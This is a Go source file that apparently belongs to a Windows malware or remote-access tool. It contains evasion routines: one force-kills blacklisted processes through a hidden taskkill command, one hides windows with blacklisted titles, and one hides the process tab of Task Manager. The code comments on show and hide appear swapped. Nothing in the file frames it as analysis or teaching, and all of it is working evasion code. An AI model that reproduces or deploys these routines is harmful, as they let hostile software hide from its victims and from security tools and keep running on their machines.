package core

import (
	"os/exec"
	"syscall"
	"time"
)

func AntiProcessScanner() { //Attempt to Kill detected processes
	for AntiProcess {
		for i := 0; i < len(BlacklistProcessNames); i++ {
			if CheckForProcess(BlacklistProcessNames[i]) {
				c := exec.Command("cmd", "/C", "taskkill /F /IM "+BlacklistProcessNames[i])
				c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				if err := c.Run(); err != nil {
					//Try another method of killing?
					continue
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func AntiWindowScanner() { //Attempt to hide Detected windows
	for AntiProcessWindow {
		for i := 0; i < len(BlacklistWindowsNames); i++ {
			g, _ := GetForegroundWindow()
			b := make([]uint16, 200)
			_, _ = GetWindowText(g, &b[0], int32(len(b)))
			if syscall.UTF16ToString(b) == BlacklistWindowsNames[i] {
				_, _, _ = procShowWindow.Call(uintptr(FindWindow(BlacklistWindowsNames[i])), uintptr(0))
			}
			time.Sleep(50 * time.Millisecond)
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func AntiTaskManager(state bool) {
	for {
		TaskManager := FindWindow("Task Manager")
		if TaskManager != 0 {
			TaskProcTab := GetChildHandle(TaskManager)
			if state {
				ShowWindow(TaskProcTab, 1) //Hide
			} else {
				ShowWindow(TaskProcTab, 0) //Show
			}
			CloseHandle(TaskProcTab)
			CloseHandle(TaskManager)
		}
		time.Sleep(250 * time.Millisecond)
	}
}
